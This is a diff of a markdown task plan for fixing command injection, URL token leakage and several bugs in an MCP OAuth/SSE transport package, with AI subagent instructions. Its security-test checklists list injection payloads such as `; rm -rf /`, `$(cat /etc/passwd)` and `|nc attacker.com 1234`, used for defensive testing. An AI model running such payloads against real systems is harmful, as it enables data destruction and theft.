@@ -1,10 +1,13 @@
 # OAuth & SSE Transport Implementation - Phase 4: Critical Security Fixes & Major Bug Resolution
 
 ## 🔴 CRITICAL SECURITY NOTICE
+
 **This phase addresses CRITICAL SECURITY VULNERABILITIES and MAJOR BUGS that make the current implementation unsafe and non-functional for production use. ALL tasks in this phase are HIGH PRIORITY and MUST be completed.**
 
 ## Your responsibility
+
 **BEFORE** creating tasks, keep in mind:
+
 - you need to assess the current state first
 - make sure to detect existing packages (recursively, use a scan for package.json, excluding **/node_modules/**)
   to understand the repo first, then check relevant files for focus.
@@ -38,6 +41,7 @@ To start parallel subagent workers, you **MUST** send a single message with mult
 ## Supervisor Verification Protocol
 
 **AFTER EACH WORKER COMPLETES**, the supervisor MUST:
+
 1. [ ] Run `git status` to verify files are tracked
 2. [ ] Run `yarn validate packages/mcp` personally
 3. [ ] Run `yarn test packages/mcp` personally
@@ -52,14 +56,18 @@ To start parallel subagent workers, you **MUST** send a single message with mult
 ### 1. Critical Security Vulnerabilities
 
 #### 🔴 A) Command Injection in `KeychainTokenStorage`
+
 **Severity: CRITICAL - Remote Code Execution**
+
 - **File**: packages/mcp/src/auth/implementations/keychain-token-storage.ts
 - **Vulnerability**: User-controlled `serverId` directly interpolated into shell commands
 - **Impact**: Attackers can execute arbitrary commands (e.g., `rm -rf /`, `cat /etc/passwd`)
 - **Example Attack**: serverId = `"; rm -rf / #"` would delete the entire filesystem
 
 #### 🔴 B) Auth Token Leakage in URLs
+
 **Severity: HIGH - Credential Exposure**
+
 - **File**: packages/mcp/src/transports/implementations/sse-client-transport.ts
 - **Vulnerability**: Auth tokens passed as URL query parameters
 - **Impact**: Tokens exposed in server logs, shell history, network monitoring tools
@@ -68,13 +76,17 @@ To start parallel subagent workers, you **MUST** send a single message with mult
 ### 2. Major Bugs & Design Flaws
 
 #### 🔴 A) Broken Request-Response Handling
+
 **Severity: CRITICAL - Complete RPC Failure**
+
 - **File**: packages/mcp/src/transports/implementations/base-client-transport.ts
 - **Bug**: Promise handlers are no-ops (`resolve: () => {}, reject: () => {}`)
 - **Impact**: RPC calls never receive responses, making the transport non-functional
 
 #### 🔴 B) Broken OAuth State Management & Race Conditions
+
 **Severity: HIGH - Authentication Failures**
+
 - **Files**: packages/mcp/src/auth/implementations/oauth2-authorization-code.ts, packages/mcp/src/index.ts
 - **Issues**:
   1. Single `pendingAuth` variable causes race conditions
@@ -82,13 +94,17 @@ To start parallel subagent workers, you **MUST** send a single message with mult
   3. O(n) iteration through all servers to find OAuth state
 
 #### 🔴 C) Memory Leak from Event Listeners
+
 **Severity: MEDIUM - Resource Exhaustion**
+
 - **File**: packages/mcp/src/transports/implementations/sse-client-transport.ts
 - **Bug**: `.bind(this)` creates new function instances, preventing removal
 - **Impact**: Memory leaks in long-running processes
 
 #### 🔴 D) Broken Transport Replacement Logic
+
 **Severity: HIGH - OAuth Header Loss**
+
 - **File**: packages/mcp/src/transports/implementations/streamable-http-client-transport.ts
 - **Bug**: `Object.assign` doesn't properly copy internal state/getters/setters
 - **Impact**: OAuth headers not applied after transport upgrade
@@ -103,9 +119,11 @@ To start parallel subagent workers, you **MUST** send a single message with mult
 ## Phase 4 Objectives
 
 ### Primary Goal
+
 **Fix all critical security vulnerabilities, major bugs, and design flaws to make the implementation production-ready.**
 
 ### Success Criteria
+
 - [x] Zero command injection vulnerabilities
 - [x] Zero credential exposure in logs/URLs
 - [x] Functional request-response correlation
@@ -120,20 +138,24 @@ To start parallel subagent workers, you **MUST** send a single message with mult
 ## Implementation Plan
 
 ### Task 1: Fix Command Injection in KeychainTokenStorage ✅
+
 **Priority: 🔴 CRITICAL - Security Vulnerability**
 **Size: Medium (3-4 hours)**
 **Status: COMPLETED - Commit: 83d1669**
 
 **BEFORE** starting this task:
+
 - You **MUST** assess the current KeychainTokenStorage implementation
 - You **MUST** identify all shell command executions
 - You **MUST** understand the attack vectors
 - You **MUST** ensure no other worker is modifying token storage
 
 **Files to modify:**
+
 - `packages/mcp/src/auth/implementations/keychain-token-storage.ts`
 
 **Implementation requirements:**
+
 - [ ] Replace `exec()` with `execFile()` for all shell commands
 - [ ] Implement strict serverId validation (alphanumeric + dash/underscore/period only)
 - [ ] Use parameterized commands with argument arrays (no string interpolation)
@@ -141,6 +163,7 @@ To start parallel subagent workers, you **MUST** send a single message with mult
 - [ ] Return clear errors for invalid serverIds
 
 **Example implementation:**
+
 ```typescript
 // Validation
 const SAFE_SERVER_ID_REGEX = /^[a-zA-Z0-9._-]+$/;
@@ -150,16 +173,22 @@ if (!SAFE_SERVER_ID_REGEX.test(serverId)) {
 
 // Safe command execution
 import { execFile } from 'child_process';
-execFile('security', ['add-generic-password', '-a', serverId, '-s', 'mcp-oauth', '-w', token], callback);
+execFile(
+  'security',
+  ['add-generic-password', '-a', serverId, '-s', 'mcp-oauth', '-w', token],
+  callback,
+);
 ```
 
 **Security tests to add:**
+
 - [ ] Test with malicious inputs: `; rm -rf /`, `$(cat /etc/passwd)`, `|nc attacker.com 1234`
 - [ ] Test with special characters: `'`, `"`, `` ` ``, `$`, `&`, `|`, `;`, `\n`
 - [ ] Verify no shell interpretation occurs
 - [ ] Test valid serverIds still work
 
 **DO NOT** proceed to next task until:
+
 - [ ] `yarn validate packages/mcp` passes WITHOUT ANY ERRORS OR ISSUES
 - [ ] `yarn test packages/mcp` passes WITHOUT ANY ERRORS OR ISSUES
 - [ ] Security tests confirm no command injection possible
@@ -167,20 +196,24 @@ execFile('security', ['add-generic-password', '-a', serverId, '-s', 'mcp-oauth',
 - [ ] All files modified by this task have been committed
 
 ### Task 2: Fix Auth Token Leakage in URLs ✅
+
 **Priority: 🔴 CRITICAL - Security Vulnerability**
 **Size: Medium (3-4 hours)**
 **Status: COMPLETED - Commit: 0e116ab**
 
 **BEFORE** starting this task:
+
 - You **MUST** tick the checklist boxes for previous task
 - You **MUST** verify eventsource package supports headers in Node.js
 - You **MUST** understand current token passing mechanism
 - You **MUST** ensure no other worker is modifying SSE transport
 
 **Files to modify:**
+
 - `packages/mcp/src/transports/implementations/sse-client-transport.ts`
 
 **Implementation requirements:**
+
 - [ ] Remove all token parameters from URLs
 - [ ] Pass tokens via Authorization headers
 - [ ] Update EventSource initialization to use headers
@@ -188,17 +221,19 @@ execFile('security', ['add-generic-password', '-a', serverId, '-s', 'mcp-oauth',
 - [ ] Ensure headers work with eventsource package v4.0.0
 
 **Example implementation:**
+
 ```typescript
 const eventSourceInit = {
   headers: {
-    'Authorization': `Bearer ${token}`,
-    'Content-Type': 'text/event-stream'
-  }
+    Authorization: `Bearer ${token}`,
+    'Content-Type': 'text/event-stream',
+  },
 };
 const eventSource = new EventSource(url, eventSourceInit);
 ```
 
 **Security tests to add:**
+
 - [ ] Verify tokens NEVER appear in URLs
 - [ ] Check URL.toString() doesn't contain sensitive data
 - [ ] Verify headers contain authorization
@@ -206,6 +241,7 @@ const eventSource = new EventSource(url, eventSourceInit);
 - [ ] Mock server access logs to ensure no token logging
 
 **DO NOT** proceed to next task until:
+
 - [ ] `yarn validate packages/mcp` passes WITHOUT ANY ERRORS OR ISSUES
 - [ ] `yarn test packages/mcp` passes WITHOUT ANY ERRORS OR ISSUES
 - [ ] Security tests confirm no token leakage
@@ -213,20 +249,24 @@ const eventSource = new EventSource(url, eventSourceInit);
 - [ ] All files modified by this task have been committed
 
 ### Task 3: Fix Broken Request-Response Handling ✅
+
 **Priority: 🔴 CRITICAL - Functional Failure**
 **Size: Medium (4-5 hours)**
 **Status: COMPLETED - Commit: c6b3cc8**
 
 **BEFORE** starting this task:
+
 - You **MUST** tick the checklist boxes for previous task
 - You **MUST** understand the current promise correlation issue
 - You **MUST** review how WebSocket transport handles this correctly
 - You **MUST** ensure no other worker is modifying base transport
 
 **Files to modify:**
+
 - `packages/mcp/src/transports/implementations/base-client-transport.ts`
 
 **Implementation requirements:**
+
 - [ ] Store actual promise resolve/reject functions (not no-ops)
 - [ ] Implement proper response correlation by request ID
 - [ ] Add timeout handling for pending requests
@@ -234,6 +274,7 @@ const eventSource = new EventSource(url, eventSourceInit);
 - [ ] Handle error responses properly
 
 **Example implementation:**
+
 ```typescript
 send(message: any): Promise<any> {
   const requestId = generateId();
@@ -270,6 +311,7 @@ handleResponse(response: any) {
 ```
 
 **Tests to add:**
+
 - [ ] Test request-response correlation works
 - [ ] Test multiple concurrent requests
 - [ ] Test timeout handling
@@ -277,6 +319,7 @@ handleResponse(response: any) {
 - [ ] Test memory cleanup after resolution
 
 **DO NOT** proceed to next task until:
+
 - [ ] `yarn validate packages/mcp` passes WITHOUT ANY ERRORS OR ISSUES
 - [ ] `yarn test packages/mcp` passes WITHOUT ANY ERRORS OR ISSUES
 - [ ] Request-response tests pass
@@ -284,21 +327,25 @@ handleResponse(response: any) {
 - [ ] All files modified by this task have been committed
 
 ### Task 4: Fix OAuth State Management & Race Conditions ✅
+
 **Priority: 🔴 HIGH - Authentication Failures**
 **Size: Large (6-7 hours)**
 **Status: COMPLETED - Commit: 4102bc3**
 
 **BEFORE** starting this task:
+
 - You **MUST** tick the checklist boxes for previous task
 - You **MUST** understand the race condition with pendingAuth
 - You **MUST** review the completeOAuthFlow issue
 - You **MUST** ensure no other worker is modifying OAuth providers or index.ts
 
 **Files to modify:**
+
 - `packages/mcp/src/auth/implementations/oauth2-authorization-code.ts`
 - `packages/mcp/src/index.ts`
 
 **Implementation requirements:**
+
 - [ ] Replace single `pendingAuth` with Map<string, PendingAuth>
 - [ ] Use OAuth state as the Map key
 - [ ] Fix completeOAuthFlow to pass state to new instances
@@ -307,6 +354,7 @@ handleResponse(response: any) {
 - [ ] Add state expiration (10 minutes)
 
 **Example implementation:**
+
 ```typescript
 class OAuth2AuthCodeProvider {
   private pendingAuthFlows = new Map<string, PendingAuth>();
@@ -319,7 +367,7 @@ class OAuth2AuthCodeProvider {
     this.pendingAuthFlows.set(state, {
       verifier,
       serverId,
-      timestamp: Date.now()
+      timestamp: Date.now(),
     });
     this.stateToServer.set(state, serverId);
 
@@ -344,6 +392,7 @@ class OAuth2AuthCodeProvider {
 ```
 
 **Tests to add:**
+
 - [ ] Test concurrent OAuth flows don't interfere
 - [ ] Test state expiration after 10 minutes
 - [ ] Test invalid state rejection
@@ -351,6 +400,7 @@ class OAuth2AuthCodeProvider {
 - [ ] Test completeOAuthFlow with passed state
 
 **DO NOT** proceed to next task until:
+
 - [ ] `yarn validate packages/mcp` passes WITHOUT ANY ERRORS OR ISSUES
 - [ ] `yarn test packages/mcp` passes WITHOUT ANY ERRORS OR ISSUES
 - [ ] OAuth flow tests pass
@@ -358,26 +408,31 @@ class OAuth2AuthCodeProvider {
 - [ ] All files modified by this task have been committed
 
 ### Task 5: Fix Memory Leak from Event Listeners ✅
+
 **Priority: 🔴 HIGH - Resource Exhaustion**
 **Size: Small (2-3 hours)**
 **Status: COMPLETED - Commit: 2c934ca**
 
 **BEFORE** starting this task:
+
 - You **MUST** tick the checklist boxes for previous task
 - You **MUST** understand the .bind() issue
 - You **MUST** review all event listener additions/removals
 - You **MUST** ensure no other worker is modifying SSE transport
 
 **Files to modify:**
+
 - `packages/mcp/src/transports/implementations/sse-client-transport.ts`
 
 **Implementation requirements:**
+
 - [ ] Store bound functions as class properties
 - [ ] Use stored references for both add and remove
 - [ ] Verify all listeners are properly removed
 - [ ] Clear bound functions on cleanup
 
 **Example implementation:**
+
 ```typescript
 class SSEClientTransport {
   private boundHandlers: {
@@ -417,12 +472,14 @@ class SSEClientTransport {
 ```
 
 **Tests to add:**
+
 - [ ] Test event listeners are properly removed
 - [ ] Test no memory leak after multiple reconnections
 - [ ] Use weak references to verify cleanup
 - [ ] Test bound functions are same instance
 
 **DO NOT** proceed to next task until:
+
 - [ ] `yarn validate packages/mcp` passes WITHOUT ANY ERRORS OR ISSUES
 - [ ] `yarn test packages/mcp` passes WITHOUT ANY ERRORS OR ISSUES
 - [ ] Memory leak tests pass
@@ -430,20 +487,24 @@ class SSEClientTransport {
 - [ ] All files modified by this task have been committed
 
 ### Task 6: Fix Broken Transport Replacement ✅
+
 **Priority: HIGH - OAuth Header Loss**
 **Size: Medium (4-5 hours)**
 **Status: COMPLETED - Commit: 73a348a**
 
 **BEFORE** starting this task:
+
 - You **MUST** tick the checklist boxes for previous task
 - You **MUST** understand Object.assign limitations
 - You **MUST** review transport upgrade flow
 - You **MUST** ensure no other worker is modifying streamable transport
 
 **Files to modify:**
+
 - `packages/mcp/src/transports/implementations/streamable-http-client-transport.ts`
 
 **Implementation requirements:**
+
 - [ ] Replace Object.assign with proper transport replacement
 - [ ] Implement state transfer mechanism
 - [ ] Preserve auth headers during upgrade
@@ -451,6 +512,7 @@ class SSEClientTransport {
 - [ ] Test with different transport types
 
 **Example implementation:**
+
 ```typescript
 class StreamableHTTPClientTransport {
   private currentTransport: Transport;
@@ -482,6 +544,7 @@ class StreamableHTTPClientTransport {
 ```
 
 **Tests to add:**
+
 - [ ] Test transport upgrade preserves auth headers
 - [ ] Test state transfer between transports
 - [ ] Test old transport is properly closed
@@ -489,6 +552,7 @@ class StreamableHTTPClientTransport {
 - [ ] Test with SSE→WebSocket upgrade
 
 **DO NOT** proceed to next task until:
+
 - [ ] `yarn validate packages/mcp` passes WITHOUT ANY ERRORS OR ISSUES
 - [ ] `yarn test packages/mcp` passes WITHOUT ANY ERRORS OR ISSUES
 - [ ] Transport upgrade tests pass
@@ -496,26 +560,31 @@ class StreamableHTTPClientTransport {
 - [ ] All files modified by this task have been committed
 
 ### Task 7: Consolidate Validation Utilities (DRY) ✅
+
 **Priority: MEDIUM - Code Quality**
 **Size: Medium (3-4 hours)**
 **Status: COMPLETED - Commit: 3f85820**
 
 **BEFORE** starting this task:
+
 - You **MUST** tick the checklist boxes for previous task
 - You **MUST** identify all duplicated validation logic
 - You **MUST** plan the consolidation strategy
 - You **MUST** ensure no other worker is modifying utils
 
 **Files to create:**
+
 - `packages/mcp/src/utils/validation-utils.ts`
 
 **Files to modify:**
+
 - `packages/mcp/src/auth/implementations/bearer-token-provider.ts`
 - `packages/mcp/src/auth/utils/oauth-utils.ts`
 - `packages/mcp/src/transports/transport-factory.ts`
 - Any other files with duplicated validation
 
 **Implementation requirements:**
+
 - [ ] Create ValidationUtils class with static methods
 - [ ] Extract URL validation logic
 - [ ] Extract environment variable resolution
@@ -524,6 +593,7 @@ class StreamableHTTPClientTransport {
 - [ ] Remove all duplicated code
 
 **Example implementation:**
+
 ```typescript
 export class ValidationUtils {
   private static readonly SAFE_SERVER_ID_REGEX = /^[a-zA-Z0-9._-]+$/;
@@ -557,6 +627,7 @@ export class ValidationUtils {
 ```
 
 **Tests to add:**
+
 - [ ] Test URL validation with various formats
 - [ ] Test serverId sanitization with safe/unsafe inputs
 - [ ] Test environment variable resolution
@@ -564,6 +635,7 @@ export class ValidationUtils {
 - [ ] Verify no duplicated code remains
 
 **DO NOT** proceed to next task until:
+
 - [ ] `yarn validate packages/mcp` passes WITHOUT ANY ERRORS OR ISSUES
 - [ ] `yarn test packages/mcp` passes WITHOUT ANY ERRORS OR ISSUES
 - [ ] All duplicated code eliminated
@@ -571,21 +643,25 @@ export class ValidationUtils {
 - [ ] All files modified by this task have been committed
 
 ### Task 8: Standardize Error Handling ✅
+
 **Priority: MEDIUM - Code Quality**
 **Size: Small (2-3 hours)**
 **Status: COMPLETED - Commit: c6ec1ca**
 
 **BEFORE** starting this task:
+
 - You **MUST** tick the checklist boxes for previous task
 - You **MUST** identify all error handling patterns
 - You **MUST** decide on standard pattern
 - You **MUST** ensure no other worker is modifying error handling
 
 **Files to modify:**
+
 - All files using TransportError
 - `packages/mcp/src/transports/transport-factory.ts` (fix isValid() usage)
 
 **Implementation requirements:**
+
 - [ ] Standardize on static factory methods for TransportError
 - [ ] Remove direct enum usage pattern
 - [ ] Fix isValid() boolean check (not try/catch)
@@ -593,6 +669,7 @@ export class ValidationUtils {
 - [ ] Add deprecation comments if keeping both patterns temporarily
 
 **Example implementation:**
+
 ```typescript
 // Standardize on this pattern:
 throw TransportError.connectionFailed('Connection refused');
@@ -606,12 +683,14 @@ if (!authProvider.isValid()) {
 ```
 
 **Tests to add:**
+
 - [ ] Test all error factory methods
 - [ ] Test isValid() returns boolean
 - [ ] Verify consistent error messages
 - [ ] Test error serialization
 
 **DO NOT** proceed to next task until:
+
 - [ ] `yarn validate packages/mcp` passes WITHOUT ANY ERRORS OR ISSUES
 - [ ] `yarn test packages/mcp` passes WITHOUT ANY ERRORS OR ISSUES
 - [ ] Error handling is consistent
@@ -619,20 +698,24 @@ if (!authProvider.isValid()) {
 - [ ] All files modified by this task have been committed
 
 ### Task 9: Remove Redundant StdioClientTransport ✅
+
 **Priority: LOW - Cleanup**
 **Size: Small (1-2 hours)**
 **Status: COMPLETED - Commit: 769313a**
 
 **BEFORE** starting this task:
+
 - You **MUST** tick the checklist boxes for previous task
 - You **MUST** verify new StdioClientTransport is fully functional
 - You **MUST** check for any dependencies on old version
 - You **MUST** ensure backward compatibility if needed
 
 **Files to modify:**
+
 - `packages/mcp/src/index.ts`
 
 **Implementation requirements:**
+
 - [ ] Remove PrefixedStdioClientTransport from index.ts
 - [ ] Update exports to use new StdioClientTransport
 - [ ] Add deprecation notice if keeping for compatibility
@@ -640,11 +723,13 @@ if (!authProvider.isValid()) {
 - [ ] Verify no breaking changes for consumers
 
 **Tests to verify:**
+
 - [ ] All existing tests still pass
 - [ ] No import errors
 - [ ] Backward compatibility maintained
 
 **DO NOT** proceed to next task until:
+
 - [ ] `yarn validate packages/mcp` passes WITHOUT ANY ERRORS OR ISSUES
 - [ ] `yarn test packages/mcp` passes WITHOUT ANY ERRORS OR ISSUES
 - [ ] No breaking changes introduced
@@ -652,17 +737,20 @@ if (!authProvider.isValid()) {
 - [ ] All files modified by this task have been committed
 
 ### Task 10: Comprehensive Security Test Suite ✅
+
 **Priority: 🔴 CRITICAL - Validation**
 **Size: Large (5-6 hours)**
 **Status: COMPLETED - Commit: f9b93ee**
 
 **BEFORE** starting this task:
+
 - You **MUST** tick the checklist boxes for ALL previous tasks
 - You **MUST** ensure all security fixes are implemented
 - You **MUST** plan comprehensive attack scenarios
 - You **MUST** ensure no other worker is modifying tests
 
 **Files to create:**
+
 - `packages/mcp/test/security/command-injection.test.ts`
 - `packages/mcp/test/security/token-exposure.test.ts`
 - `packages/mcp/test/security/oauth-security.test.ts`
@@ -670,6 +758,7 @@ if (!authProvider.isValid()) {
 **Test scenarios to implement:**
 
 **Command Injection Tests:**
+
 - [ ] Test with shell metacharacters: `;`, `|`, `&`, `$`, `` ` ``, `\n`
 - [ ] Test with command substitution: `$(cmd)`, `` `cmd` ``
 - [ ] Test with path traversal: `../../../etc/passwd`
@@ -677,6 +766,7 @@ if (!authProvider.isValid()) {
 - [ ] Verify execFile prevents all injections
 
 **Token Exposure Tests:**
+
 - [ ] Scan all URLs for token patterns
 - [ ] Check HTTP logs for token leakage
 - [ ] Verify headers contain tokens
@@ -684,6 +774,7 @@ if (!authProvider.isValid()) {
 - [ ] Check error messages don't expose tokens
 
 **OAuth Security Tests:**
+
 - [ ] Test CSRF protection with state parameter
 - [ ] Test PKCE implementation
 - [ ] Test token storage encryption
@@ -691,6 +782,7 @@ if (!authProvider.isValid()) {
 - [ ] Test state expiration and cleanup
 
 **DO NOT** mark this task complete until:
+
 - [ ] ALL security tests pass
 - [ ] `yarn validate packages/mcp` passes WITHOUT ANY ERRORS OR ISSUES
 - [ ] `yarn test packages/mcp` passes WITHOUT ANY ERRORS OR ISSUES
@@ -700,28 +792,33 @@ if (!authProvider.isValid()) {
 ## Execution Strategy
 
 ### Critical Path
+
 Tasks 1-6 are CRITICAL and must be completed in sequence due to security and functional issues.
 
 ### Parallel Work Groups
 
 **Group A: Security Fixes (Tasks 1-2)**
+
 - Fix command injection
 - Fix token leakage
 - Must complete before any other work
 
 **Group B: Functional Fixes (Tasks 3-6)**
+
 - Fix request-response handling
 - Fix OAuth state management
 - Fix memory leaks
 - Fix transport replacement
 
 **Group C: Quality Improvements (Tasks 7-9)**
+
 - Consolidate utilities
 - Standardize errors
 - Remove redundancy
 - Can work after security fixes
 
 ### Sequential Dependencies
+
 1. Tasks 1-2 (Security) → All other tasks
 2. Task 3 (Request-Response) → Task 4 (OAuth State)
 3. Tasks 1-9 → Task 10 (Security Tests)
@@ -729,6 +826,7 @@ Tasks 1-6 are CRITICAL and must be completed in sequence due to security and fun
 ## Validation Checklist
 
 Before marking Phase 4 complete:
+
 - [x] `yarn test packages/mcp` - ALL tests pass
 - [x] Zero security vulnerabilities (verified by security tests)
 - [x] Request-response correlation functional
@@ -743,11 +841,13 @@ Before marking Phase 4 complete:
 ## Risk Mitigation
 
 ### Identified Risks
+
 1. **Security fixes may break existing functionality** - Comprehensive testing required
 2. **Performance impact from additional validation** - Benchmark before/after
 3. **Backward compatibility concerns** - Careful migration strategy needed
 
 ### Mitigation Strategies
+
 - Create security test suite FIRST to validate fixes
 - Run performance benchmarks after each task
 - Keep old code paths with deprecation warnings if needed
@@ -757,6 +857,7 @@ Before marking Phase 4 complete:
 ## Success Metrics
 
 ### Quantitative
+
 - **Security Vulnerabilities**: 0 (down from 2 critical)
 - **Major Bugs**: 0 (down from 4)
 - **Code Coverage**: ≥95%
@@ -764,6 +865,7 @@ Before marking Phase 4 complete:
 - **Memory Leaks**: 0
 
 ### Qualitative
+
 - All auth tokens secure (never in URLs/logs)
 - No possibility of command injection
 - Concurrent operations work reliably
@@ -773,6 +875,7 @@ Before marking Phase 4 complete:
 ## Emergency Protocols
 
 If a security vulnerability is discovered during implementation:
+
 1. **STOP all work immediately**
 2. **Document the vulnerability**
 3. **Implement fix as highest priority**
@@ -783,6 +886,7 @@ If a security vulnerability is discovered during implementation:
 ## Definition of Done
 
 Phase 4 is complete when:
+
 - [x] ALL security vulnerabilities eliminated
 - [x] ALL major bugs fixed
 - [x] ALL tests passing with ≥95% coverage
